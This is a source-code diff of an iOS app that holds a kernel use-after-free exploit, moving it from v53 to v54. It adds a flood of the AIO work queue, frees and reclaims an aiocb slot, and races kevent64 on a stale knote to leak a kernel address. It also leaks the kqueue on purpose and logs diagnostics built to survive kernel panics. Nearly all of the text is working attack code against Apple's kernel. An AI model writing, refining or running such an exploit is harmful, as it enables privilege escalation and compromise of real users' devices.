@@ -247,10 +247,10 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v53: Race kevent64 — call kevent64 IMMEDIATELY after confirming entry alive.
-// v52 proved: 256MB+128MB offset → entry survives ~2364 aio_error() calls.
-// v53 replaces the diagnostic spin loop with immediate kevent64 to win the race.
-struct v53_state {
+// v54: Flood workq with 30 AIO reads BEFORE reclaim. rcb goes to TAIL of workq,
+// worker is busy with flood entries → kevent64 has time to fire BEFORE worker
+// reaches rcb and frees it. Diag written to Documents (persists across reboot).
+struct v54_state {
     int fd;
     int kq;
     struct kevent64_s kev;
@@ -258,10 +258,11 @@ struct v53_state {
     int err;
     int aio_read_rc;
     int aio_read_errno;
-    int rcb_err;          // aio_error(&rcb) right after aio_read
-    int kevent_called;    // 1 = called kevent64 (entry was alive)
-    int kq_leaked;        // 1 = kq NOT closed (avoid filt_aio_detach on stale knote)
-    char diag_path[256];
+    int rcb_err;
+    int kevent_called;
+    int kq_leaked;
+    int flood_count;      // number of flood entries successfully submitted
+    char diag_path[512];  // Documents path (persists across reboot)
 };
 
 // v19: E2 racer state — aio_return frees E2's slot, OOL spray reclaims it.
@@ -282,24 +283,39 @@ static void aio_set_thread_affinity(int tag) {
                       (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
 }
 
-// v53: Race kevent64 — confirms entry alive via aio_error, then calls kevent64
-// IMMEDIATELY. NO spin loop (v52's spin loop deliberately waited for worker death).
-// v52 proved the entry survives ~2364 aio_error calls on 256MB+128MB — that window
-// is wide enough for kevent64 to fire BEFORE the worker frees the entry.
-// Writes diagnostic to fsync'd file BEFORE kevent64 (survives kernel panic).
-static void *v53_exploit_thread(void *arg) {
-    struct v53_state *st = (struct v53_state *)arg;
+// v54: Flood workq BEFORE reclaim — 30 AIO reads at unique offsets push rcb
+// to TAIL of workq. Worker must process all 30 flood entries before rcb,
+// giving kevent64 ~60us+ window. Diag written to Documents/ (reboot-safe).
+static void *v54_exploit_thread(void *arg) {
+    struct v54_state *st = (struct v54_state *)arg;
     aio_set_thread_affinity(42);
 
     int kq = kqueue();
     if (kq < 0) { st->err = errno; return NULL; }
     st->kq = kq;
+    int fd = st->fd;
+
+    // ---- FLOOD: 30 x 1KB AIO reads to fill workq ahead of rcb ----
+    struct aiocb fb[30];
+    char fbuf[30][1024];
+    int nflood = 0;
+    for (int i = 0; i < 30; i++) {
+        memset(&fb[i], 0, sizeof(fb[i]));
+        fb[i].aio_fildes = fd;
+        fb[i].aio_buf = fbuf[i];
+        fb[i].aio_nbytes = sizeof(fbuf[i]);
+        fb[i].aio_offset = (128ULL * 1024 * 1024) + (i * 4096);
+        fb[i].aio_lio_opcode = LIO_READ;
+        fb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+        if (aio_read(&fb[i]) == 0) nflood++;
+    }
+    st->flood_count = nflood;
 
     // tcb: 4KB at offset 0, SIGEV_KEVENT → knote on kq
     struct aiocb tcb;
     char tbuf[4096];
     memset(&tcb, 0, sizeof(tcb));
-    tcb.aio_fildes = st->fd;
+    tcb.aio_fildes = fd;
     tcb.aio_buf = tbuf;
     tcb.aio_nbytes = sizeof(tbuf);
     tcb.aio_offset = 0;
@@ -307,14 +323,14 @@ static void *v53_exploit_thread(void *arg) {
     tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
     tcb.aio_sigevent.sigev_signo = kq;
 
-    // rcb: 8KB at offset 128MB, SIGEV_NONE — 256MB file, physical NVMe read
+    // rcb: 8KB at offset 128MB, SIGEV_NONE — reclaims tcb's slot via LIFO
     struct aiocb rcb;
     char rbuf[8192];
     memset(&rcb, 0, sizeof(rcb));
-    rcb.aio_fildes = st->fd;
+    rcb.aio_fildes = fd;
     rcb.aio_buf = rbuf;
     rcb.aio_nbytes = sizeof(rbuf);
-    rcb.aio_offset = 128ULL * 1024 * 1024;  // 128MB offset — well beyond cache
+    rcb.aio_offset = 128ULL * 1024 * 1024;
     rcb.aio_lio_opcode = LIO_READ;
     rcb.aio_sigevent.sigev_notify = SIGEV_NONE;
 
@@ -327,35 +343,30 @@ static void *v53_exploit_thread(void *arg) {
     // Wait for tcb I/O completion
     while (aio_error(&tcb) == EINPROGRESS) {}
 
-    // Free tcb → slot S on CPU 42 magazine (zfree)
+    // Free tcb → slot S on CPU 42 magazine
     aio_return(&tcb);
 
-    // Reclaim slot S with rcb (zalloc LIFO from CPU 42 magazine)
+    // Reclaim slot S with rcb — rcb at TAIL of workq (behind nflood entries)
     int rc = aio_read(&rcb);
     st->aio_read_rc = rc;
     st->aio_read_errno = (rc < 0) ? errno : 0;
 
-    // v53: Check if entry is alive, then call kevent64 IMMEDIATELY.
-    // v52 proved entry survives 2364 aio_error calls on this file setup.
     st->rcb_err = aio_error(&rcb);
 
-    // Write diagnostic to file BEFORE kevent64 (fsync survives kernel panic)
+    // Write diagnostic to Documents (persists across reboot)
     if (st->diag_path[0] != '\0') {
         int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (dfd >= 0) {
-            char dbuf[256];
+            char dbuf[512];
             int dlen = snprintf(dbuf, sizeof(dbuf),
-                "aio_read_rc=%d errno=%d rcb_err=%d\n",
-                rc, st->aio_read_errno, st->rcb_err);
+                "aio_read_rc=%d errno=%d rcb_err=%d floods=%d\n",
+                rc, st->aio_read_errno, st->rcb_err, nflood);
             write(dfd, dbuf, dlen);
             fsync(dfd);
             close(dfd);
         }
     }
 
-    // v53: If entry is alive, race kevent64 RIGHT NOW — no spin loop.
-    // The spin loop in v52 was MEASURING entry lifetime (deliberately waiting
-    // for worker to finish). v53 does the OPPOSITE: fire kevent64 ASAP.
     if (st->rcb_err == EINPROGRESS) {
         st->nev = kevent64(kq, NULL, 0, &st->kev, 1, 0, NULL);
         st->kevent_called = 1;
@@ -433,7 +444,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v53" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v54" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5819,7 +5830,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v53 (Race kevent64) =========="];
+    [self appendLog:@"\n========== AIO UAF v54 (Workq Flood) =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5832,8 +5843,9 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v53: Create diagnostic file path BEFORE the exploit — survives kernel panic
-    NSString *diagPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"diag_v53.txt"];
+    // v54: Diagnostic file in Documents (persists across kernel panic / reboot)
+    NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v54.txt"];
     unlink(diagPath.UTF8String);
 
     NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_uaf.bin"];
@@ -5842,16 +5854,14 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v53" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v54" forState:UIControlStateNormal];
         });
         return;
     }
-    // v53: RACE kevent64 — call IMMEDIATELY after confirming entry alive.
-    // v52 PROVED: 256MB+128MB offset → entry survives ~2364 aio_error() calls.
-    // The spin loop DELIBERATELY waited for the worker to free the entry.
-    // v53 does the OPPOSITE: fire kevent64 RIGHT NOW before worker completes.
-    // v52 also showed: close(kq) on stale knote → EAGAIN on subsequent aio_read.
-    // v53: LEAK kq on failure to keep AIO subsystem clean for retries.
+    // v54: FLOOD workq with 30 AIO reads BEFORE reclaim.
+    // rcb goes to TAIL of workq → worker must process all 30 flood entries
+    // before reaching rcb → kevent64 has ~60us+ to fire and read the knote.
+    // v52/v53 proved: entry dies before kevent64 can fire when rcb at HEAD.
     fcntl(fd, F_NOCACHE, 1);
     {
         const size_t fsize = 256 * 1024 * 1024;  // 256MB
@@ -5864,27 +5874,26 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"fd=%d file=256MB F_NOCACHE pid=%d uid=%d", fd, getpid(), getuid()]];
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
-    // v53: RACE — call kevent64 RIGHT AFTER aio_error check, not after spin loop.
-    // v52 proved the entry lives ~2364 aio_error() iterations on this setup.
-    // That's PLENTY of time for a single kevent64 syscall to fire and win.
+    // v54: Flood workq BEFORE reclaim gives kevent64 time to win the race.
+    // 30 flood entries × ~2us each ≈ 60us window for kevent64 to read knote.
 
     uint64_t entryAddr = 0;
 
-    // ---- Phase A v53: race kevent64 ----
-    [self appendLog:@"\n--- Phase A v53: immediate kevent64 if entry alive ---"];
+    // ---- Phase A v54: workq flood + kevent64 ----
+    [self appendLog:@"\n--- Phase A v54: 30-flood workq + kevent64 ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"  attempt %d/5", attempt + 1]];
 
-        struct v53_state st = {};
+        struct v54_state st = {};
         st.fd = fd;
         st.kq = -1;
         st.nev = -1;
         strncpy(st.diag_path, diagPath.UTF8String, sizeof(st.diag_path) - 1);
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v53_exploit_thread, &st);
+        pthread_create(&thr, NULL, v54_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         // Read diagnostic file (fsync'd before kevent64 — survives kernel panic)
@@ -5901,8 +5910,8 @@ static void *e2_free_and_ool_racer(void *arg) {
             continue;
         }
 
-        [self appendLog:[NSString stringWithFormat:@"  aio_read rc=%d errno=%d",
-            st.aio_read_rc, st.aio_read_errno]];
+        [self appendLog:[NSString stringWithFormat:@"  aio_read rc=%d errno=%d floods=%d",
+            st.aio_read_rc, st.aio_read_errno, st.flood_count]];
         [self appendLog:[NSString stringWithFormat:@"  rcb_err=%d(%s) kevent_called=%d",
             st.rcb_err,
             st.rcb_err == EINPROGRESS ? "INPROGRESS" : (st.rcb_err == 0 ? "DONE" : "ERR"),
@@ -5911,8 +5920,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         if (!st.kevent_called) {
             [self appendLog:[NSString stringWithFormat:@"  kevent64 SKIPPED (entry dead, rcb_err=%d)",
                 st.rcb_err]];
-            // v53: LEAK kq — close(kq) would call filt_aio_detach on stale knote,
-            // which corrupts AIO state → EAGAIN on subsequent aio_read (v52 bug).
+            // LEAK kq — close(kq) on stale knote → EAGAIN on retry (v52 bug).
             st.kq_leaked = 1;
             continue;
         }
@@ -5955,8 +5963,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v53: Health check ----
-    [self appendLog:@"\n--- Phase C v53: Health check ---"];
+    // ---- Phase C v54: Health check ----
+    [self appendLog:@"\n--- Phase C v54: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -5982,11 +5990,11 @@ cleanup:
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v53 Complete =========="];
+    [self appendLog:@"========== AIO UAF v54 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v53" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v54" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
